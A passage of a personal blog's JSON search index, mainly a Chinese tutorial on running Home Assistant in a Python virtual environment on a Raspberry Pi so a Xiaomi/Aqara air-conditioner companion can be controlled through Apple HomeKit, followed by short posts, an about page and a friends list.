44,107,183,0,183,403],\u0026quot;ott_stat\u0026quot;:[0,0,0,0]} 子设备信息： [] 然后在树莓派上安装Home Assistant（理论上也可以装在任何Linux的机子上）\nHA官方推荐的方式是直接刷他们预制好的hass.io（似乎是一个魔改Linux？）但这样就树莓派别的事就干不了了，这里就用它提供的python虚拟机运行方式好了。\n（以下在树莓派3b上可成功运行）\n先把python装上：（速度太慢建议换源）\napt-get install python3-pip python3-venv #可能还要装这几个 apt-get install build-essential libssl-dev libffi-dev python3-dev 创建给HA的python虚拟机\npython3 -m venv homeassistant 切换到HA的目录\ncd homeassistant 激活虚拟机环境\nsource bin/activate 装上HA（国内慢可换源）\npython3 -m pip install wheel python3 -m pip install homeassistant 不过小米的空调伴侣似乎与最新版的HA不兼容(读不出空调)，推荐先安装0.91.4的\npip3 install homeassistant==0.91.4 #多等一会，这一步比较慢 #装完之后输入 hass --open-ui #来启动WebUI 然后可以在 http://your-rpi-ip:8123/ 上登陆HA的界面了（这一步第一次也会比较久，可能要10-20min）\n如果能正常打开，就可以去改一下config了\ncd .homeassistant/ #到存放配置的地方 现在里面新建一个 custom_components/climate 的文件夹，然后把这个repo里面的的climate.py放进climate文件夹，重命名成 xiaomi_miio_airconditioningcompanion.py\n再回到 ~/.homeassistant 修改一下 configuration.yaml ， 参考GitHub和这里的配置在文件后面添加一下设备：\nxiaomi_aqara: gateways: - mac: 04CF8C9A59C1 key: xxxxx #网关功能 climate: - platform: xiaomi_miio_airconditioningcompanion name: Aqara Air Conditioning Companion host: AC.controller.s.ip token: xxxxx target_sensor: sensor.temperature_158d0001f53706 scan_interval: 60 #空调遥控功能 如果要使用苹果的HomeKit来控制，还要加上：\nhomekit: auto_start: true port: 51827 保存退出，下一次打开webui的时候你应该就能看到那个调温的圆环和跟HomeKit配对的代码了（6位数）\n直接在iPad/iPhone或者Mac上打开家庭应用，手动输入代码添加就可以用了，不过除非宿舍里有一台用来当hub的iPad/HomePod，操作必须在同一个网络下进行。\nhomekit控制的话可选项会比较少，只能开关和调整温度\n有了空调伴侣，天热时能够早些把空调打开，或者是在出门后确认一下空调有没有关，还是有些用处的。\n（等期中考完就可以开始填坑了，也许会把之前配置校园网和内网网盘的东西弄上来？）\n","permalink":"https://blog.sparktour.me/posts/2019/04/26/home-assistant-using-the-pc-apple-homekit-to-control-mi-home-accessories/","summary":"\u003cp\u003e\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://www.home-assistant.io/images/hero_screenshot.png\" alt=\"\"  /\u003e\n    \u003cfigcaption\u003e\u003c/figcaption\u003e\n\u003c/figure\u003e\n\u003c/p\u003e\n\u003ch2 id=\"使用pcapple-homekit控制米家等智能家居\"\u003e使用PC/Apple HomeKit控制米家等智能家居\u003c/h2\u003e\n\u003c!-- more --\u003e\n\u003cp\u003e在大一上时购入了一台二手树莓派3b，但一般也只用来挂一下pt，当个下载机和简易nas使用。后来发现\u003ca href=\"https://www.home-assistant.io/\"\u003eHome Assistant\u003c/a\u003e这个软件可以连接许多智能家庭平台，于是在绿米Aqura空调伴侣打折时入了一个。\u003c/p\u003e","title":"Home Assistant: Using the PC/Apple HomeKit to Control Mi Home Accessories"},{"content":" to be written\n","permalink":"https://blog.sparktour.me/posts/2019/04/21/using-ubuntu-to-make-an-old-pc-great-again/","summary":"\u003cp\u003e\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.ubuntu.com/v1/c6504e94-Dell_XPS_Laptop_Front-Desktop.png\" alt=\"\"  /\u003e\n    \u003cfigcaption\u003e\u003c/figcaption\u003e\n\u003c/figure\u003e\n\u003c/p\u003e\n\u003cp\u003eto be written\u003c/p\u003e","title":"Using Ubuntu to Make an Old PC Great Again"},{"content":"Officially Say Hello to The World\n我的第一个自建的blog总算搭好了（虽然说只是一个基于Wordpress的玩意）\n现在它运行在GCE上，对于电信用户来说，体验应该还不错，不过联通和移动用户可能需要忍受它的高延迟了。\n现在我也不知道在这里写些什么好😂，也许是分享一下自己的一些发现，或是一些别的东西？希望我能用动力去时常更新它，以能给我的留下一些记忆吧。\n2019年4月19日\n","permalink":"https://blog.sparktour.me/posts/2019/04/18/hello-world-1/","summary":"\u003cp\u003eOfficially Say Hello to The World\u003c/p\u003e\n\u003cp\u003e我的第一个自建的blog总算搭好了（虽然说只是一个基于Wordpress的玩意）\u003c/p\u003e\n\u003cp\u003e现在它运行在\u003ca href=\"https://cloud.google.com/\"\u003eGCE\u003c/a\u003e上，对于电信用户来说，体验应该还不错，不过联通和移动用户可能需要忍受它的高延迟了。\u003c/p\u003e\n\u003cp\u003e现在我也不知道在这里写些什么好😂，也许是分享一下自己的一些发现，或是一些别的东西？希望我能用动力去时常更新它，以能给我的留下一些记忆吧。\u003c/p\u003e","title":"Hello World!"},{"content":" Shenzhen Bay Bridge To HK on Shenzhen Side on 26 July 2018\n","permalink":"https://blog.sparktour.me/posts/2019/04/17/a-little-test-about-image/","summary":"\u003cp\u003e\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Shenzhen_Bay_Bridge_To_HK_on_Shenzhen_Side.jpg/1280px-Shenzhen_Bay_Bridge_To_HK_on_Shenzhen_Side.jpg\" alt=\"\"  /\u003e\n    \u003cfigcaption\u003e\u003c/figcaption\u003e\n\u003c/figure\u003e\n\u003c/p\u003e\n\u003cp\u003eShenzhen Bay Bridge To HK on Shenzhen Side on  26 July 2018\u003c/p\u003e","title":"a little test about image"},{"content":"on Apr 17, 2019\n","permalink":"https://blog.sparktour.me/posts/2019/04/17/finally-it-works/","summary":"\u003cp\u003eon Apr 17, 2019\u003c/p\u003e","title":"Finally, it works!"},{"content":"@sparkcyf Major in EE, postgraduate student in SUSTech.\nStudent assistant of SUSTech CCSE and maintainer of SUSTech Open Source Mirrors.\nContact me via\u0026hellip; KeyBase\nEmail me@sparktour.me\nAmateur radio or DMR Callsign: BA7LKC\nDMR ID: 4603443\nFlight Map Airlines Flown Airlines Flown ","permalink":"https://blog.sparktour.me/about/","summary":"\u003ch1 id=\"sparkcyf\"\u003e@sparkcyf\u003c/h1\u003e\n\u003cp\u003eMajor in EE, postgraduate student in \u003ca href=\"https://www.sustech.edu.cn/en\"\u003eSUSTech\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eStudent assistant of \u003ca href=\"https://hpc.sustech.edu.cn/\"\u003eSUSTech CCSE\u003c/a\u003e and maintainer of \u003ca href=\"https://mirrors.sustech.edu.cn/\"\u003eSUSTech Open Source Mirrors\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"contact-me-via\"\u003eContact me via\u0026hellip;\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://keybase.io/sparkcyf\"\u003eKeyBase\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"email\"\u003eEmail\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"mailto:me@sparktour.me\"\u003eme@sparktour.me\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"amateur-radio-or-dmr\"\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Amateur_radio\"\u003eAmateur radio\u003c/a\u003e or \u003ca href=\"https://en.wikipedia.org/wiki/Digital_mobile_radio\"\u003eDMR\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003eCallsign: BA7LKC\u003c/p\u003e\n\u003cp\u003eDMR ID: 4603443\u003c/p\u003e\n\u003ch3 id=\"flight-map\"\u003eFlight Map\u003c/h3\u003e\n\u003ciframe width=\"100%\" height=\"400\" src=\"https://assets.sparktour.me/img/blog/misc/flight-map-sparktour.html\" frameborder=\"0\"\u003e\u003c/iframe\u003e\n\u003ch3 id=\"airlines-flown\"\u003eAirlines Flown\u003c/h3\u003e\n\u003cp\u003e\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/misc/airlines-flew/airlines_flew.webp\" alt=\"Airlines Flown\"  /\u003e\n    \u003cfigcaption\u003eAirlines Flown\u003c/figcaption\u003e\n\u003c/figure\u003e\n\u003c/p\u003e\n\u003ciframe width=\"100%\" height=\"450\" src=\"https://embed.windy.com/embed2.html?lat=22.322\u0026lon=114.197\u0026detailLat=22.550\u0026detailLon=114.060\u0026width=650\u0026height=450\u0026zoom=9\u0026level=surface\u0026overlay=wind\u0026product=ecmwf\u0026menu=\u0026message=\u0026marker=true\u0026calendar=now\u0026pressure=\u0026type=map\u0026location=coordinates\u0026detail=true\u0026metricWind=m%2Fs\u0026metricTemp=%C2%B0C\u0026radarRange=-1\" frameborder=\"0\"\u003e\u003c/iframe\u003e","title":"About"},{"content":"Friends 友链 liziwl soaked.in whexy yuantong infiWang Xuyang John Zhao ","permalink":"https://blog.sparktour.me/friends/","summary":"\u003ch1 id=\"friends-友链\"\u003eFriends 友链\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://liziwl.cn/en/\"\u003eliziwl\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://soaked.in/\"\u003esoaked.in\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.whexy.com/\"\u003ewhexy\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://yuantong.me/\"\u003eyuantong\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://blog.infi.wang/\"\u003einfiWang\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://ysfhtxn.github.io/\"\u003eXuyang John Zhao\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","title":"Friends"}]